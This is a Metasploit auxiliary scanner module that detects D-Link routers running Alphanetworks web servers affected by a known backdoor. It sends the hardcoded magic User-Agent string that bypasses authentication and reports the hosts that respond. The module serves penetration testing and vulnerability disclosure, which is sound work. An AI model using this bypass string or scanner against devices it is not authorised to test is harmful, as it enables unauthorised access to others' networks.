##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'D-Link User-Agent Backdoor Scanner',
      'Description'    => %q{
        This module attempts to find D-Link devices running Alphanetworks web interfaces affected
        by the backdoor found on the User-Agent header. This module has been tested successfully
        on a DIR-100 device with firmware version v1.13.
      },
      'Author'         =>
        [
          'Craig Heffner', # vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/' ]
        ],
      # First documented in detail by Craig, but looks like it's been known
      # (at least to the Russians :-) ) since 2010 - see post at forum.codenet.ru
      'DisclosureDate' => "Oct 12 2013"
    )

  end

  def is_alpha_web_server?
    begin
      res = send_request_cgi({'uri' => '/'})
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return false
    end

    # Signatures:
    # * httpd-alphanetworks/2.23
    # * Alpha_webserv
    if res and res.headers["Server"] and res.headers["Server"] =~ /alpha/i
      return true
    end

    return false
  end

  def run_host(ip)

    if is_alpha_web_server?
      vprint_good("#{ip} - Alphanetworks web server detected")
    else
      vprint_error("#{ip} - Alphanetworks web server doesn't detected")
      return
    end

    begin
      res = send_request_cgi({
        'uri'     => '/',
        'method'  => 'GET',
        'agent' => 'xmlset_roodkcableoj28840ybtide'
      })
    rescue ::Rex::ConnectionError
      vprint_error("#{ip}:#{rport} - Failed to connect to the web server")
      return
    end

    # DIR-100 device with firmware version v1.13
    # not sure if this matches on other devices
    # TODO: Testing on other devices
    if res and res.code == 200 and res.headers["Content-length"] != 0 and res.body =~ /Home\/bsc_internet\.htm/
      print_good("#{ip}:#{rport} - Vulnerable for authentication bypass via User-Agent Header \"xmlset_roodkcableoj28840ybtide\"")
    end

  end
end
